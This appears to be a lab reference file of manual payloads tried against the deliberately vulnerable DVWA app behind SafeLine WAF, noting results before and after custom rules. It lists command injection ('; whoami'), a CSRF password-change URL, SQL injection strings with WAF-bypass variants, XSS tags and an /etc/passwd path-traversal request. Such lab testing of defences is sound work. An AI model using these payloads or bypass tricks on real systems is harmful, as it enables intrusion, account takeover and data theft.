# Manual Test Payloads

Reference payloads used for manual (browser-based) testing against DVWA through SafeLine WAF.
Each was tried both before and after the relevant custom rule was added.

## Command Injection

DVWA Command Injection page, "Enter an IP address" field:

```
127.0.0.1; whoami
```

- Default WAF result: **Audited only** — command executed, `www-data` returned.
- After custom deny rule (POST field `ip`, regex match): **Blocked**.

## CSRF (Password Change)

Crafted URL exploiting DVWA's unprotected password-change form (no CSRF token check):

```
http://dvwa.lab/vulnerabilities/csrf/?password_new=newpassword&password_conf=newpassword&Change=Change#
```

- Default WAF result: **Audited only** — password changed successfully.
- After custom deny rule (URL Path, regex match on the query pattern): **Blocked**.

## SQL Injection (manual, pre-sqlmap)

DVWA SQL Injection page, "User ID" field:

```
1' OR '1'='1
```

Bypass attempts tried manually before moving to sqlmap (all blocked):

```
1' oR '1'='1
1'/**/OR/**/'1'='1
1%27%20OR%20%271%27%3D%271
```

## Reflected / Stored XSS

```
<script>alert('XSS')</script>
```

Both Reflected and Stored XSS pages — blocked by default ruleset.

## XSS (DOM)

```
http://dvwa.lab/vulnerabilities/xss_d/?default=<script>alert(1)</script>
```

Blocked by default ruleset.

## Local File Inclusion (LFI)

```
http://dvwa.lab/vulnerabilities/fi/?page=../../../../etc/passwd
```

Blocked by default ruleset.
